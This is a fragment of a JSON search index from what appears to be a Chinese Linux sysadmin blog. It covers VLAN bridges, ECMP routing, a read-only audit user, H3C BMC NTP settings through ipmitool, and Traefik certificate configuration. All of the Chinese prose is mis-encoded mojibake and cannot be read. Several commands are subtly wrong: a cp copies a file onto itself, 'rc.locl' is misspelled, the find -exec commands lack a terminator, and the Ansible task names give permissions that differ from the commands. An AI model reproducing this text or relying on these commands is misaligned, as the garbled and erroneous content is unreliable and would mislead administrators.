ä¸€ä¸ªVLANæ®µ202ï¼Œç„¶ååœ¨ä¸Šé¢ç”Ÿäº§ä¸€å°è™šæœº172.18.19.2\u003c/p\u003e\n\u003cp\u003eå°±éœ€è¦å¢åŠ ä¸€ä¸ªbond0.202ä»¥åŠbr0.202\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/sysconfig/network-scripts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp ifcfg-bond0.199 ifcfg-bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ifcfg-bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVLAN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp ifcfg-br0.199 ifcfg-br0.199\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ifcfg-br0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå¯åŠ¨è¿™ä¸¤ä¸ªç½‘å¡ï¼Œå¯åŠ¨é¡ºåºå¾ˆé‡è¦ï¼ï¼ï¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup br0.202\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œæ‰§è¡Œå®Œä»¥ååŠ¡å¿…æ£€æŸ¥ä¸€ä¸‹ä¸¤ä¸ªç½‘å¡æ˜¯å¦UP\u003c/p\u003e\n\u003cp\u003eç„¶åäº§è™šæœºå°±å¥½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./vm.sh create -b br0.202 -c \u003cspan class=\"m\"\u003e4\u003c/span\u003e -m \u003cspan class=\"m\"\u003e4096\u003c/span\u003e -d \u003cspan class=\"m\"\u003e40\u003c/span\u003e  -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linuxä¸‹bondå’Œbrå»ºç«‹vlançš„æ–¹æ³•"},{"content":"æˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡ºå£ï¼Œä¸€ä¸ªä»æ— é”¡å‡ºï¼Œä¸€ä¸ªä»ä¸–çºªäº’è”å‡º\nè¿™å°æœºå™¨çš„em1æ¥ä¸–çºªäº’è”ï¼Œem2æ¥æ— é”¡å°šèˆªï¼Œä¸¤ä¸ªç½‘å…³ï¼Œæœ‰ipv6å’Œipv4\nISP 1:\rGateways:\r172.16.9.254\r2001:db8:a::1\rInterface: em1\rISP 2:\rGateways:\r172.18.9.254\r2001:db8:b::1\rInterface: em2\ré‚£ä¹ˆè¿™å°æœºå™¨çš„ECMPç­‰ä»·è·¯ç”±è¿™ä¹ˆåšï¼š\nip route replace default proto static scope global \\\rnexthop dev em1 via 172.16.9.254 weight 1 \\\rnexthop dev em2 via 172.18.9.254 weight 1\rip -6 route replace default proto static scope global \\\rnexthop dev em1 via 2001:db8:a::1 weight 1 \\\rnexthop dev em2 via 2001:db8:b::1 weight 1\rè¿™ä¸¤æ¡å‘½ä»¤éœ€è¦æ”¾åˆ° /etc/rc.d/rc.locl æˆ–è€…ifupé‡Œé¢å»\nä¹‹åå‘åŒ…çš„æ—¶å€™å°±ä¼šä¸€å·¦ä¸€å³è½®æµå‘ã€‚\n","permalink":"https://rendoumi.com/posts/20231227-linux_ecmp/","summary":"\u003cp\u003eæˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡ºå£ï¼Œä¸€ä¸ªä»æ— é”¡å‡ºï¼Œä¸€ä¸ªä»ä¸–çºªäº’è”å‡º\u003c/p\u003e\n\u003cp\u003eè¿™å°æœºå™¨çš„em1æ¥ä¸–çºªäº’è”ï¼Œem2æ¥æ— é”¡å°šèˆªï¼Œä¸¤ä¸ªç½‘å…³ï¼Œæœ‰ipv6å’Œipv4\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eISP 1:\r\n    Gateways:\r\n        172.16.9.254\r\n        2001:db8:a::1\r\n    Interface: em1\r\n\t\r\nISP 2:\r\n    Gateways:\r\n        172.18.9.254\r\n        2001:db8:b::1\r\n    Interface: em2\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eé‚£ä¹ˆè¿™å°æœºå™¨çš„ECMPç­‰ä»·è·¯ç”±è¿™ä¹ˆåšï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eip route replace default proto static scope global \\\r\n    nexthop dev em1 via 172.16.9.254 weight 1 \\\r\n    nexthop dev em2 via 172.18.9.254 weight 1\r\n\r\nip -6 route replace default proto static scope global \\\r\n    nexthop dev em1 via 2001:db8:a::1 weight 1 \\\r\n    nexthop dev em2 via 2001:db8:b::1 weight 1\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿™ä¸¤æ¡å‘½ä»¤éœ€è¦æ”¾åˆ° /etc/rc.d/rc.locl æˆ–è€…ifupé‡Œé¢å»\u003c/p\u003e","title":"Linuxä¸‹ECMPç­‰ä»·è·¯ç”±çš„å»ºç«‹"},{"content":"å®¡è®¡çš„è¦æ±‚ï¼š\nçº¿ä¸Šç¯å¢ƒç ”å‘åªèƒ½æœ‰åªè¯»æƒé™\né‚£åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼Œä¸¤ä¸ªç”¨æˆ·ï¼Œsupdevæ˜¯è¿ç»´ç”¨æ¥ç®¡ç†çš„ï¼Œlogviewæ˜¯ç ”å‘ç”¨æ¥åªè¯»æ—¥å¿—çš„\nä¸€ã€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨ id supdev é€šå¸¸supdevçš„idæ˜¯511\näºŒã€å¢åŠ æ–°ç”¨æˆ·logview æˆ‘ä»¬ç¡®å®šlogviewçš„idæ˜¯512ï¼Œgroupæ˜¯å’ŒsupdevåŒç»„ useradd -u 512 -g supdev logview\nä¸‰ã€ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹ï¼Œè€Œæ˜¯åœ¨/data/serversä¸‹ æ‰€ä»¥æˆ‘ä»¬æŠŠ/data/serversä¸‹çš„ç›®å½•éƒ½æ”¹æˆ750ï¼Œæ–‡ä»¶éƒ½æ”¹æˆ640\n#!/bin/sh\rfind /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {}\rfind /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {} # ansible æ¨¡å—\r- name: make dirs 0755\rcommand: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \\;\r- name: make files 0644\rcommand: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \\; è¿™æ ·å°±å¯ä»¥äº†ã€‚logviewå¯ä»¥å»åˆ°/data/serversç›®å½•ï¼Œå¯ä»¥çœ‹æ–‡ä»¶ï¼Œä½†æ— æ³•æ‰§è¡Œã€‚\n","permalink":"https://rendoumi.com/posts/20231227-supdev_logview/","summary":"\u003cp\u003eå®¡è®¡çš„è¦æ±‚ï¼š\u003c/p\u003e\n\u003cp\u003eçº¿ä¸Šç¯å¢ƒç ”å‘åªèƒ½æœ‰åªè¯»æƒé™\u003c/p\u003e\n\u003cp\u003eé‚£åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼Œä¸¤ä¸ªç”¨æˆ·ï¼Œsupdevæ˜¯è¿ç»´ç”¨æ¥ç®¡ç†çš„ï¼Œlogviewæ˜¯ç ”å‘ç”¨æ¥åªè¯»æ—¥å¿—çš„\u003c/p\u003e\n\u003ch3 id=\"ä¸€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨\"\u003eä¸€ã€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨\u003c/h3\u003e\n\u003cp\u003eid supdev\né€šå¸¸supdevçš„idæ˜¯511\u003c/p\u003e\n\u003ch3 id=\"äºŒå¢åŠ æ–°ç”¨æˆ·logview\"\u003eäºŒã€å¢åŠ æ–°ç”¨æˆ·logview\u003c/h3\u003e\n\u003cp\u003eæˆ‘ä»¬ç¡®å®šlogviewçš„idæ˜¯512ï¼Œgroupæ˜¯å’ŒsupdevåŒç»„\nuseradd -u 512 -g supdev logview\u003c/p\u003e\n\u003ch3 id=\"ä¸‰ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹è€Œæ˜¯åœ¨dataserversä¸‹\"\u003eä¸‰ã€ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹ï¼Œè€Œæ˜¯åœ¨/data/serversä¸‹\u003c/h3\u003e\n\u003cp\u003eæ‰€ä»¥æˆ‘ä»¬æŠŠ/data/serversä¸‹çš„ç›®å½•éƒ½æ”¹æˆ750ï¼Œæ–‡ä»¶éƒ½æ”¹æˆ640\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/bin/sh\r\nfind /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {}\r\nfind /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# ansible æ¨¡å—\r\n- name: make dirs 0755\r\n  command: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \\;\r\n\r\n- name: make files 0644\r\n  command: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \\;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™æ ·å°±å¯ä»¥äº†ã€‚logviewå¯ä»¥å»åˆ°/data/serversç›®å½•ï¼Œå¯ä»¥çœ‹æ–‡ä»¶ï¼Œä½†æ— æ³•æ‰§è¡Œã€‚\u003c/p\u003e","title":"å®¡è®¡éœ€æ±‚åªè¯»ç”¨æˆ·çš„å»ºç«‹"},{"content":"H3CæœåŠ¡å™¨ä¸»æ¿æ—¶é—´ä¸å‡†ç¡®ä¹Ÿå¾ˆè®¨åŒï¼Œçœ‹ä¸»æ¿æ—¥å¿—æ—¶é—´éƒ½æ˜¯é”™çš„ï¼Œæ²¡åŠæ³•ï¼Œä¿®æ”¹ä¸€ä¸‹ã€‚\nH3CæœåŠ¡å™¨BIOSçš„NTPè®¾ç½®æ–¹æ³•ï¼š\nä¿®æ”¹ä¸»æœåŠ¡å™¨ï¼š\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² ä¿®æ”¹è¾…æœåŠ¡å™¨ï¼š\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² ä¿®æ”¹ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼š\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² æ–¹æ³•å¾ˆç®€å•ï¼Œä½†æ˜¯æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²å¦‚ä½•å¾—åˆ°ï¼Ÿ\necho -n \u0026#34;172.18.30.1\u0026#34; | od -A n -t x1 | sed \u0026#34;s/ / 0x/g\u0026#34;\r0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 ä¿®æ”¹NTPæœåŠ¡å™¨1ä¸º172.18.30.1\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 ","permalink":"https://rendoumi.com/posts/20231226-h3c_ntp/","summary":"\u003cp\u003eH3CæœåŠ¡å™¨ä¸»æ¿æ—¶é—´ä¸å‡†ç¡®ä¹Ÿå¾ˆè®¨åŒï¼Œçœ‹ä¸»æ¿æ—¥å¿—æ—¶é—´éƒ½æ˜¯é”™çš„ï¼Œæ²¡åŠæ³•ï¼Œä¿®æ”¹ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eH3CæœåŠ¡å™¨BIOSçš„NTPè®¾ç½®æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹ä¸»æœåŠ¡å™¨ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹è¾…æœåŠ¡å™¨ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ–¹æ³•å¾ˆç®€å•ï¼Œä½†æ˜¯æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²å¦‚ä½•å¾—åˆ°ï¼Ÿ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho -n \u0026#34;172.18.30.1\u0026#34; | od -A n -t x1 | sed  \u0026#34;s/ / 0x/g\u0026#34;\r\n0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹NTPæœåŠ¡å™¨1ä¸º172.18.30.1\u003c/p\u003e","title":"H3CæœåŠ¡çš„BIOSä¸»æ¿è®¾ç½®ä¸­å¦‚ä½•æ­£ç¡®è®¾ç½®NTPæœåŠ¡å™¨"},{"content":"traefikä½¿ç”¨digicertä»˜è´¹çš„è¯ä¹¦å’Œä½¿ç”¨letencryptå…è´¹è¯ä¹¦çš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€ä¹ˆé…ç½®ï¼š\ntraefik.ymlé‡Œé¢å°±æ²¡æœ‰ä»»ä½•é…ç½®\nlog: level: DEBUG api: insecure: false dashboard: true entryPoints: http: address: \u0026#34;:80\u0026#34; #http: # redirections: # entryPoint: # to: https # scheme: https https: address: \u0026#34;:443\u0026#34; providers: file: directory: /export/servers/traefik/dynamic watch: true æ‰€æœ‰çš„é…ç½®éƒ½æ”¾åˆ°åˆ°/export/servers/traefik/dynamicç›®å½•ä¸‹äº†ï¼ŒåŠ¨æ€æ›´æ–°ï¼š\ncerts.ymlæ¥å®šä¹‰è¯ä¹¦é€‰é¡¹\ntls: certificates: - certFile: \u0026#34;/export/servers/traefik/ddky.crt\u0026#34; keyFile: \u0026#34;/export/servers/traefik/ddky.key\u0026#34; options: default: sniStrict: true minVersion: VersionTLS12 cipherSuites: - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 test7-01.ymlå•ç‹¬test7.ddky.comçš„é…ç½®\nhttp: routers: https_01: rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; service: svc_01 tls: domains: - main: \u0026#34;test7.ddky.com\u0026#34; sans: - \u0026#34;*.ddky.com\u0026#34; http_01: rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; service: svc_01 entryPoints: - http services: svc_01: loadBalancer: servers: test8-02.ymlå•ç‹¬test8.ddky.comçš„é…ç½®\nhttp: routers: https_02: rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; service: svc_02 tls: domains: - main: \u0026#34;test8.ddky.com\u0026#34; http_02: rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; service: svc_02 entryPoints: - http services: svc_02: loadBalancer: servers: - url: \u0026#34;http://172.18.31.33:80\u0026#34; æ³¨æ„ä¸Šé¢tlsçš„é€‰é¡¹ï¼Œsanså¤‡ç”¨åŸŸåå¯åŠ å¯ä¸åŠ ã€‚\n","permalink":"https://rendoumi.com/posts/20231221-traefik_digicert/","summary":"\u003cp\u003etraefikä½¿ç”¨digicertä»˜è´¹çš„è¯ä¹¦å’Œä½¿ç”¨letencryptå…è´¹è¯ä¹¦çš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€ä¹ˆé…ç½®ï¼š\u003c/p\u003e\n\u003cp\u003etraefik.ymlé‡Œé¢å°±æ²¡æœ‰ä»»ä½•é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elevel\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eDEBUG\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eapi\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003einsecure\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edashboard\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eentryPoints\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:80\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#http:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#  redirections:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#    entryPoint:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#      to: https\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#      scheme: https\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttps\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:443\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eproviders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003edirectory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/export/servers/traefik/dynamic\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ewatch\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ‰€æœ‰çš„é…ç½®éƒ½æ”¾åˆ°åˆ°/export/servers/traefik/dynamicç›®å½•ä¸‹äº†ï¼ŒåŠ¨æ€æ›´æ–°ï¼š\u003c/p\u003e\n\u003cp\u003ecerts.ymlæ¥å®šä¹‰è¯ä¹¦é€‰é¡¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003etls\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 